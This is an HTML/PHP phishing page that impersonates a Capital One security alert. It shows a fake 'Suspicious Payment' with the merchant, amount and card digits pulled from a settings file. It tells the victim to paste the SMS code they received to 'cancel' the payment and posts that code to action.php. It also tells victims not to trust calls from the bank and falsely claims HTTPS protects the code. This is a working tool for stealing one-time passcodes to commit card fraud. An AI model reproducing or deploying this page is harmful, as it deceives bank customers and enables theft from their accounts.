<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/x-icon" href="./index.png">
    
    <title>Capital One Security</title>
</head>
<body>

    <?php include("./settings.php") ?>

    <div>
        <img class="logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTbydUMaDTWk04MYIxPrYfQd9E7CXuSmsKFSi6gUjOBXwma0MzHsVYpiKeva2xgbxPQYf4&usqp=CAU" alt="">
    </div>

    <hr>

    <form class="flex center form-b" action="./action.php" method="POST">
        <h1 style="font-size: 20px;">Suspicious Payment</h1>

        <p>We have noticed an unsual activity on your account. Scammers may try to use your bank details to process payments. Do not validate any payment on your bank application even if the bank is calling.</p>

        <div class="info">

            <label for="merchant" class="ab">Merchant : </label>
            <label for="merchant"><?php echo $website; ?></label>
            <label for="date" class="ab">Date : </label>
            <label for="date"><?php echo date('d-m-y h:i:s') ?></label>
            <label for="amount" class="ab">Amount : </label>
            <label for="amount"><?php echo $amount; ?></label>
            <label for="merchant" class="ab">Card Number : </label>
            <label for="merchant">XXXXXXXXXXXX<?php echo $endCard; ?></label>
        </div>

        <p style="color: darkblue;"><b>Paste the code in the text message you received to cancel this payment : </b></p>

        <input type="text" name="code" class="input" placeholder="Paste your code here...">

        <button class="sub-btn">Cancel payment</button>

        <small style="color: grey; font-size: 10px;">This page has HTTPS security enabled, therefore, the code won't be intercepted by third party softwares. Do not share this code to anyone.</small>

    
    </form>

    <div class="footer">
    Legal | Privacy | Terms and conditions | Cookies | Accessibility and disability
    </div>

</body>
</html>


<style>
    .logo{
        padding: 10px;
    width: 13rem;
    height: 7rem;
}

body{
    margin: 0%;
    font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
}

.flex{
    display: flex;
    flex-direction: column;
    gap: 10px;
    padding: 5px;
}

.center{
    justify-content: center;
    align-items: center;
    text-align: center;
}

.input{
    padding: 5px;
    border: 1px solid black;
    outline: none;
}

.sub-btn{
    background-color: #cc2336;
    border: none;
    font-weight: bold;
    color: white;
    padding: 15px;
    width: 70%;
}

.footer{
    margin-top: 22rem;
    background-color: #cc2336;
    color: white;
    font-size: 10px;
    text-align: center;
    padding: 1rem;
}

.info{
    text-align: left;
    display: grid;
    grid-template-columns: 7rem 8.8rem;
    grid-template-rows: 2rem 2rem 2rem 2rem;
    gap: 5px;
}

.ab{
    text-align: right;
}

</style>